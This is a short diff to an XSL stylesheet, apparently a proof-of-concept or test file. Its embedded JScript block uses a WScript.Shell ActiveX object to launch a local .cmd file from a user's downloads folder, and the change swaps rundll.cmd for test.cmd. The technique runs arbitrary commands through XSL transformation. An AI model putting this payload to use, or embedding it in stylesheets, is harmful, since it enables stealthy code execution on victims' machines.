@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c C:\users\haibn\downloads\rundll.cmd");
+	var r = new ActiveXObject("WScript.Shell").Run("cmd /c start C:\users\haibn\downloads\test.cmd");
 	]]> </ms:script>
 </stylesheet>
